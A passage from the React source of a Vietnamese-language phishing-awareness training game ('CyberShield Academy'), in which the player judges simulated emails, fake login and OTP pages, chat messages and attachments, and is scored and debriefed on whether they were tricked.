    })
    if (scenarioType === 'MAIL_FILE') {
      // MAIL+FILE: verify flow is fully driven from download action.
      handleEmailDecision('VERIFIED', { bypassAttachmentGate: true })
    }
  }, [appendTrapVerifiedDecision, currentEmail, gameActions, handleEmailDecision, scenarioType])

  const handleReportPhishing = useCallback(() => {
    handleEmailDecision('QUARANTINE')
  }, [handleEmailDecision])

  const handleVerifyMail = useCallback(() => {
    handleEmailDecision('VERIFIED')
  }, [handleEmailDecision])

  const refreshSession = useCallback(() => {
    if (typeof window !== 'undefined') {
      window.location.reload()
    }
  }, [])

  const handleTrustZalo = useCallback(
    (text = '') => {
      if (!currentEmail || !canAct) return
      const rawId = currentEmail?.id
      const emailId =
        typeof rawId === 'number' ? rawId : Number.parseInt(String(rawId), 10) || index + 1
      if (zaloSubmittedEmailRef.current === emailId) return
      zaloSubmittedEmailRef.current = emailId

      const decision = {
        emailId,
        isPhishing: Boolean(currentEmail?.isPhishing),
        userAction: 'VERIFIED',
        payload: String(text || '').trim(),
      }
      setDecisionHistory((prev) => [...prev, decision])
      gameActions.commitDecision('VERIFIED')

      if (currentEmail?.isPhishing) {
        setStatus('GAME_OVER')
        setGameOverEmail(currentEmail)
        setGameOverNonMail(false)
        setIsFinished(false)
        return
      }

      const nextScore = scoreRef.current + SCORE_CORRECT
      scoreRef.current = nextScore
      setScore(nextScore)
      const nextIndex = index + 1
      if (nextIndex >= queue.length) {
        setStatus(nextScore < 0 ? 'GAME_OVER' : 'VICTORY')
        setIsFinished(true)
      } else {
        setIndex(nextIndex)
      }
    },
    [canAct, currentEmail, gameActions, index, queue.length],
  )

  const handleSubmitBrowserTrap = useCallback(async () => {
    if (!currentEmail) return
    const isMailWebScenario = scenarioType === 'MAIL_WEB'
    const rawId = currentEmail?.id
    const emailId =
      typeof rawId === 'number' ? rawId : Number.parseInt(String(rawId), 10) || index + 1
    if (isMailWebScenario) {
      if (webTrapSubmittedEmailRef.current === emailId) return
      webTrapSubmittedEmailRef.current = emailId
      setWebTrapBusy(true)
    }
    if (isMailOtpScenario) {
      if (otpTrapBusyRef.current) return
      otpTrapBusyRef.current = true
      setOtpTrapBusy(true)
    }

    const endMailOtpTrap = () => {
      if (isMailOtpScenario) {
        otpTrapBusyRef.current = false
        setOtpTrapBusy(false)
      }
    }

    try {
      if (isMailWebScenario) {
        const expected = WEB_CREDENTIALS[activeWebType] || WEB_CREDENTIALS.MICROSOFT
        const enteredPayload = `${browserUser.trim()}::${browserPass}`
        const expectedPayload = `${expected.user}::${expected.pass}`
        const credentialsMatch =
          browserUser.trim() === expected.user && browserPass === expected.pass
        const trustedDecision = {
          emailId,
          isPhishing: Boolean(currentEmail?.isPhishing),
          userAction: 'VERIFIED',
          payload: enteredPayload,
          expectedPayload,
        }
        setDecisionHistory((prev) => [...prev, trustedDecision])
        gameActions.commitDecision('VERIFIED')
        const delta = currentEmail?.isPhishing ? 0 : credentialsMatch ? SCORE_CORRECT : -SCORE_FALSE_REPORT
        const nextScore = scoreRef.current + delta
        scoreRef.current = nextScore
        setScore(nextScore)
        gameActions.closeBrowser()
        gameActions.setPhoneWidgetVisible(false)
        setBrowserUser('')
        setBrowserPass('')
        if (currentEmail?.isPhishing) {
          setStatus('GAME_OVER')
          setGameOverEmail(currentEmail || null)
          setGameOverNonMail(true)
          setIsFinished(false)
          hasSubmittedRef.current = false
          await submitResult({ deferDebrief: true, immediateDecisions: [trustedDecision] })
          return
        }
        const nextIndex = index + 1
        if (nextIndex >= queue.length) {
          const failedByCredentials = !currentEmail?.isPhishing && !credentialsMatch
          setStatus(nextScore < 0 || failedByCredentials ? 'GAME_OVER' : 'VICTORY')
          setIsFinished(true)
        } else {
          setIndex(nextIndex)
        }
        return
      }

      if (isMailOtpScenario) {
        const expectedOtp = generatedOtp || ensureOtpForEmail(emailId)
        mailOtpSnapshotRef.current = {
          entered: browserOtp.trim(),
          expected: expectedOtp,
          emailId,
        }
      } else {
        mailOtpSnapshotRef.current = null
      }

      if (!currentEmail.isPhishing) {
        if (!isMailOtpScenario) {
          const expected = WEB_CREDENTIALS[activeWebType]
          const credentialMatch =
            !!expected &&
            browserUser.trim() === expected.user &&
            browserPass === expected.pass
          if (!credentialMatch) {
            const nextScore = scoreRef.current - SCORE_FALSE_REPORT
            scoreRef.current = nextScore
            setScore(nextScore)
            setIsShaking(true)
            window.setTimeout(() => setIsShaking(false), 220)
            return
          }
        }
        const otpExpected = generatedOtp || mailOtpSnapshotRef.current?.expected || ensureOtpForEmail(emailId)
        const otpMatched = browserOtp.trim() === otpExpected
        if (!otpMatched) {
          if (isMailOtpScenario) {
            const wrongDecision = {
              emailId,
              isPhishing: false,
              userAction: 'VERIFIED',
              payload: mailOtpSnapshotRef.current?.entered,
              expectedPayload: mailOtpSnapshotRef.current?.expected,
            }
            setDecisionHistory((prev) => [...prev, wrongDecision])
            gameActions.commitDecision('VERIFIED')
            const nextScore = scoreRef.current - SCORE_FALSE_REPORT
            scoreRef.current = nextScore
            setScore(nextScore)
            setIsShaking(true)
            window.setTimeout(() => setIsShaking(false), 220)
            handleCloseBrowser()
            setBrowserOtp('')
            const nextIndex = index + 1
            if (nextIndex >= queue.length) {
              setStatus(nextScore < 0 ? 'GAME_OVER' : 'VICTORY')
              setIsFinished(true)
            } else {
              setIndex(nextIndex)
            }
            return
          }
          const nextScore = scoreRef.current - SCORE_FALSE_REPORT
          scoreRef.current = nextScore
          setScore(nextScore)
          setIsShaking(true)
          window.setTimeout(() => setIsShaking(false), 220)
          return
        }
        const trustedDecision = {
          emailId,
          isPhishing: false,
          userAction: 'VERIFIED',
          ...(isMailOtpScenario && mailOtpSnapshotRef.current
            ? {
                payload: mailOtpSnapshotRef.current.entered,
                expectedPayload: mailOtpSnapshotRef.current.expected,
              }
            : {}),
        }
        setDecisionHistory((prev) => [...prev, trustedDecision])
        gameActions.commitDecision('VERIFIED')
        handleCloseBrowser()
        setBrowserOtp('')
        const nextScore = scoreRef.current + SCORE_CORRECT
        scoreRef.current = nextScore
        setScore(nextScore)
        const nextIndex = index + 1
        if (nextIndex >= queue.length) {
          setStatus(nextScore < 0 ? 'GAME_OVER' : 'VICTORY')
          setIsFinished(true)
        } else {
          setIndex(nextIndex)
        }
        return
      }

      const phishedDecision = {
        emailId,
        isPhishing: true,
        userAction: 'VERIFIED',
        ...(isMailOtpScenario && mailOtpSnapshotRef.current
          ? {
              payload: mailOtpSnapshotRef.current.entered,
              expectedPayload: mailOtpSnapshotRef.current.expected,
            }
          : {}),
      }
      pendingTrapDecisionRef.current = phishedDecision
      setDecisionHistory((prev) => [...prev, phishedDecision])
      gameActions.commitDecision('VERIFIED')
      if (!isMailOtpScenario) {
        handleCloseBrowser()
      }
      gameActions.triggerPhished(
        isMailOtpScenario ? 'OTP_SUBMIT_ON_PHISHING_PAGE' : 'CREDENTIAL_SUBMIT_ON_PHISHING_PAGE',
      )
      setStatus('GAME_OVER')
      setGameOverEmail(currentEmail || null)
      setGameOverNonMail(true)
      setIsFinished(false)
      hasSubmittedRef.current = false
      await submitResult({ deferDebrief: true, immediateDecisions: [phishedDecision] })
      if (isMailOtpScenario) {
        handleCloseBrowser()
        setBrowserOtp('')
        setIndex((prev) => prev + 1)
      }
    } finally {
      endMailOtpTrap()
    }
  }, [
    browserOtp,
    currentEmail,
    gameActions,
    generatedOtp,
    handleCloseBrowser,
    index,
    isMailOtpScenario,
    scenarioType,
    activeWebType,
    browserUser,
    browserPass,
    queue.length,
    submitResult,
  ])

  const statusCls = useMemo(() => {
    if (status === 'GAME_OVER') return 'text-red-300'
    if (status === 'VICTORY') return 'text-emerald-300'
    return 'text-cyan-300'
  }, [status])

  return (
    <div className="min-h-screen flex flex-col bg-[#050B14] text-slate-100">
      <header className="relative z-10 h-16 border-b border-slate-700/60 bg-slate-900 text-white">
        <div className="mx-auto flex h-full w-full max-w-7xl items-center gap-2 px-4 sm:px-6">
          <Link
            to={scenarioRouteId ? `/campaign/${scenarioRouteId}/sessions` : '/campaigns'}
            className="inline-flex items-center gap-1.5 rounded-lg border border-white/10 bg-slate-800/70 px-2.5 py-1.5 text-xs font-semibold text-slate-200 hover:border-cyan-400/35 hover:text-cyan-200"
          >
            <ArrowLeft className="h-4 w-4" />
            Quay lại Chiến dịch
          </Link>
          <div className="inline-flex h-8 w-8 items-center justify-center rounded-lg border border-cyan-500/30 bg-cyan-950/50 text-cyan-200">
            <Network className="h-4 w-4" />
          </div>
          <p className="text-sm font-semibold text-cyan-300">CyberShield Academy</p>
          <p className="min-w-0 truncate text-sm font-semibold text-white">{campaignTitle}</p>

          <div className="ml-auto flex flex-wrap items-center gap-1.5 text-[11px] font-mono">
            <span className="rounded-md border border-cyan-500/30 bg-cyan-950/45 px-2 py-1">
              {completedCount}/{queueLen || 0} Nhiệm vụ | {progressPct}%
            </span>
            <span className="rounded-md border border-amber-500/30 bg-amber-950/40 px-2 py-1">
              THREAT LEVEL {threatLevel}
            </span>
            <span className="rounded-md border border-violet-500/30 bg-violet-950/35 px-2 py-1">
              SCORE {score}
            </span>
            <span className={['rounded-md px-2 py-1 font-semibold', statusCls].join(' ')}>{status}</span>
          </div>
        </div>
      </header>

      <main className="relative z-10 mx-auto w-full max-w-7xl px-4 py-0 sm:px-6">
        <section className="hidden rounded-2xl border border-slate-700/60 bg-[#0b1424]/90 p-4 shadow-[0_18px_50px_rgba(0,0,0,0.4)]">
          <div className="flex flex-wrap items-center gap-3">
            <div className="inline-flex h-10 w-10 items-center justify-center rounded-lg border border-cyan-500/30 bg-cyan-950/50 text-cyan-200">
              <Network className="h-5 w-5" />
            </div>
            <div className="min-w-0">
              <p className="text-sm font-semibold text-cyan-300">CyberShield Academy</p>
              <p className="truncate text-sm font-semibold text-white">{campaignTitle}</p>
            </div>
          </div>
          <div className="mt-3 flex flex-wrap items-center gap-2 text-xs font-mono">
            <span className="rounded-md border border-cyan-500/30 bg-cyan-950/45 px-2 py-1">
              {completedCount}/{queueLen || 0} Nhiệm vụ hoàn thành | {progressPct}%
            </span>
            <span className="rounded-md border border-amber-500/30 bg-amber-950/40 px-2 py-1">
              THREAT LEVEL {threatLevel}
            </span>
            <span className="rounded-md border border-violet-500/30 bg-violet-950/35 px-2 py-1">
              SCORE {score}
            </span>
            <span className={['rounded-md px-2 py-1 font-semibold', statusCls].join(' ')}>{status}</span>
          </div>
        </section>
      </main>

      <DesktopEnvironment onReportPhishing={handleReportPhishing}>
        {error ? (
          <div className="absolute left-10 right-10 top-3 z-[9] rounded-xl border border-red-400/25 bg-red-950/40 p-3 text-sm text-red-100">
            {error}
          </div>
        ) : null}

        <div
          className="pointer-events-none absolute inset-0"
          style={{ zIndex: windowZ.mail }}
        >
          <Draggable
            nodeRef={mailWindowNodeRef}
            cancel="button,input,textarea,a,.no-drag,.scrollable-content"
            defaultPosition={scenarioType === 'MAIL_ZALO' ? flow5Layout.gmail : { x: 240, y: 60 }}
            onStart={() => bringToFront('mail')}
          >
            <div
              ref={mailWindowNodeRef}
              className="pointer-events-auto inline-block w-fit cursor-grab active:cursor-grabbing"
              onMouseDown={() => bringToFront('mail')}
            >
            <AppWindow
              title={appWindowTitle}
              className="w-[920px] h-[640px]"
              onMouseDown={() => bringToFront('mail')}
            >
              {isLoading ? (
                <div className="h-full animate-pulse bg-slate-900/60" />
              ) : isFinished ? (
                <section className="flex h-full flex-col items-center justify-center bg-slate-900 text-slate-100">
                  <p className="font-mono text-xs uppercase tracking-widest text-cyan-300/80">
                    SYSTEM REPORT - DEBRIEFING
                  </p>
                  <p className="mt-2 text-lg font-semibold text-cyan-200">Đang tổng hợp kết quả mission...</p>
                </section>
              ) : (
                <GmailWindow
                  queue={queue}
                  currentIndex={index}
                  currentEmail={currentEmail}
                  scenarioType={scenarioType}
                  status={status}
                  hoveredUrl={hoveredUrl}
                  onHoverUrl={setHoveredUrl}
                  onSenderToggle={() => {
                    setSenderTooltipOpen((v) => !v)
                    gameActions.markInspectedSender()
                  }}
                  senderTooltipOpen={senderTooltipOpen}
                  canAct={canAct}
                  canVerifyMail={canVerifyMail}
                  attachmentSpec={attachmentSpec}
                  onFileDownload={handleFileDownload}
                  onLinkClick={handleLinkClick}
                  onVerifyMail={handleVerifyMail}
                  showVerifyAction={scenarioType === 'MAIL_ZALO' ? !zaloVerifyConfig.required : undefined}
                  mailOtpMode={false}
                  isShaking={isShaking}
                />
              )}
            </AppWindow>
            </div>
          </Draggable>
        </div>

        {scenarioType === 'MAIL_WEB' ? (
          <div
            className="pointer-events-none absolute inset-0"
            style={{ zIndex: windowZ.notepad }}
          >
            <Draggable
              nodeRef={notepadWindowNodeRef}
              cancel="button,input,textarea,a,.no-drag,.scrollable-content"
              defaultPosition={notepadDefaultPosition}
              onStart={() => bringToFront('notepad')}
            >
              <div
                ref={notepadWindowNodeRef}
                className="pointer-events-auto inline-block w-fit cursor-grab active:cursor-grabbing"
                onMouseDown={() => bringToFront('notepad')}
              >
                <AppWindow
                  title="Passwords.txt - Notepad"
                  className="h-[360px] w-[335px]"
                  onMouseDown={() => bringToFront('notepad')}
                >
                  <div className="h-full bg-[#f4f4f4] p-2">
                    <pre className="scrollable-content h-full overflow-auto whitespace-pre-wrap bg-white p-2 font-mono text-[12px] leading-[1.5] text-slate-800">
                      {notepadContent}
                    </pre>
                  </div>
                </AppWindow>
              </div>
            </Draggable>
          </div>
        ) : null}

        {scenarioType === 'MAIL_ZALO' ? (
          <div
            className="pointer-events-none absolute inset-0"
            style={{ zIndex: windowZ.policy }}
          >
            <Draggable
              nodeRef={policyWindowNodeRef}
              cancel="button,input,textarea,a,.no-drag,.scrollable-content"
              defaultPosition={flow5Layout.policy}
              onStart={() => bringToFront('policy')}
            >
              <div
                ref={policyWindowNodeRef}
                className="pointer-events-auto inline-block w-fit cursor-grab active:cursor-grabbing"
                onMouseDown={() => bringToFront('policy')}
              >
                <AppWindow
                  title="Company Policy Doc"
                  className="h-[520px] w-[345px]"
                  onMouseDown={() => bringToFront('policy')}
                >
                  <CompanyPolicy rules={policyRules} sections={policySections} />
                </AppWindow>
              </div>
            </Draggable>
          </div>
        ) : null}

        {scenarioType === 'MAIL_ZALO' ? (
          <div className="pointer-events-none absolute inset-0" style={{ zIndex: windowZ.chat }}>
            <Draggable
              nodeRef={chatWindowNodeRef}
              cancel="button,input,textarea,a,.no-drag,.scrollable-content"
              defaultPosition={flow5Layout.chat}
              onStart={() => bringToFront('chat')}
            >
              <div
                ref={chatWindowNodeRef}
                className="pointer-events-auto inline-block w-fit cursor-grab active:cursor-grabbing"
                onMouseDown={() => bringToFront('chat')}
              >
                <AppWindow
                  title="CompanyChat - Zalo"
                  className="w-[350px] h-[550px]"
                  onMouseDown={() => bringToFront('chat')}
                >
                  <FakeZaloPanel
                  content={activeZaloContent}
                    onTrustSend={handleTrustZalo}
                    canTrustSend={canAct}
                  fixedReplyText={zaloVerifyConfig.autoReply}
                  verifyRequired={zaloVerifyConfig.required}
                  />
                </AppWindow>
              </div>
            </Draggable>
          </div>
        ) : null}

        {gameState.ui.isBrowserOpen ? (
          <div
            className="absolute inset-0 pointer-events-none"
            style={{ zIndex: windowZ.browser }}
          >
            <Draggable
              nodeRef={browserWindowNodeRef}
              cancel="button,input,textarea,a,.no-drag,.scrollable-content"
              defaultPosition={{ x: 240, y: 100 }}
              onStart={() => bringToFront('browser')}
            >
              <div
                ref={browserWindowNodeRef}
                className="absolute pointer-events-auto inline-block w-fit overflow-hidden rounded-xl border border-slate-500 bg-white shadow-2xl cursor-grab active:cursor-grabbing"
                onMouseDown={() => bringToFront('browser')}
              >
                <div className="h-[600px] w-[800px]">
                  <FakeBrowserWindow
                    title={activeBrowserTrap?.title || scenarioModel?.traps?.browser?.title}
                    displayUrl={
                      activeBrowserTrap?.displayUrl ||
                      scenarioModel?.traps?.browser?.displayUrl ||
                      gameState.trap.openedUrl
                    }
                    webType={activeWebType}
                    formType={isMailOtpScenario ? 'OTP' : scenarioModel?.traps?.browser?.formType}
                    loginUser={browserUser}
                    loginPass={browserPass}
                    otpInput={browserOtp}
                    onLoginUserChange={setBrowserUser}
                    onLoginPassChange={setBrowserPass}
                    onOtpChange={setBrowserOtp}
                    onClose={() => {
                      if (isMailOtpScenario && otpTrapBusyRef.current) return
                      if (scenarioType === 'MAIL_WEB' && webTrapBusy) return
                      handleCloseBrowser()
                    }}
                    onSubmitTrap={handleSubmitBrowserTrap}
                    canSubmitTrap={canTrustBrowserTrap}
                    closeDisabled={isMailOtpScenario && otpTrapBusy}
                  />
                </div>
              </div>
            </Draggable>
          </div>
        ) : null}
        {scenarioType.startsWith('MAIL_') ? (
          <MailAttachmentSimulator
            open={attachmentModalOpen}
            spec={attachmentSpec}
            onClose={() => setAttachmentModalOpen(false)}
            onDownload={handleAttachmentDownload}
            onReviewed={() => {
              setOpenedAttachmentIds((prev) => {
                const id = currentEmail?.id
                if (id == null) return prev
                if (prev.some((x) => String(x) === String(id))) return prev
                return [...prev, id]
              })
            }}
          />
        ) : null}
        <PhoneOtpWidget visible={showPhoneOtpPreview} code={generatedOtp} />
      </DesktopEnvironment>

      {status === 'GAME_OVER' ? (
        <TeachableMomentOverlay
          gameOverEmail={gameOverEmail}
          gameOverNonMail={gameOverNonMail}
          onContinue={() => {
            setGameOverEmail(null)
            setGameOverNonMail(false)
            if (deferredDebriefRef.current) {
              setDebriefData(deferredDebriefRef.current)
              deferredDebriefRef.current = null
              return
            }
            setIsFinished(true)
          }}
          onRetry={refreshSession}
        />
      ) : null}

      {status === 'VICTORY' && isFinished ? (
        <div className="fixed bottom-5 right-5 z-20 rounded-xl border border-emerald-400/40 bg-emerald-950/60 px-4 py-3 text-sm text-emerald-100 shadow-[0_0_22px_rgba(52,211,153,0.2)]">
          <div className="flex items-center gap-2">
            <ShieldAlert className="h-4 w-4" />
            Ca trực hoàn tất - Không bị lừa.
          </div>
        </div>
      ) : null}

      {isSubmittingResult ? (
        <div className="fixed inset-0 z-40 flex items-center justify-center bg-black/55 backdrop-blur-sm">
          <div className="rounded-xl border border-cyan-400/30 bg-slate-950/85 px-5 py-3 text-sm font-mono text-cyan-200">
            Uploading mission report...
          </div>
        </div>
      ) : null}

      {debriefData ? (
        <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-slate-900/95 p-4 backdrop-blur-md">
          <div className="w-[800px] max-h-[90vh] overflow-y-auto">
            <DebriefOverlayPanel
              report={debriefData}
              finalScore={debriefData.finalScore}
              timeTakenSeconds={debriefData.timeTakenSeconds}
              onRetry={() => {
                setDebriefData(null)
                refreshSession()
              }}
              onBackCampaign={() => navigate('/campaigns')}
            />
          </div>
        </div>
      ) : null}

      <style>{`
        @keyframes wiggle {
          0% { transform: translateX(0); }
          25% { transform: translateX(-4px); }
          50% { transform: translateX(4px); }
          75% { transform: translateX(-3px); }
          100% { transform: translateX(0); }
        }
      `}</style>
    </div>
  )
}

export default function SurvivalInbox() {
  return (
    <GameStateProvider>
      <SurvivalInboxScreen />
    </GameStateProvider>
  )
}
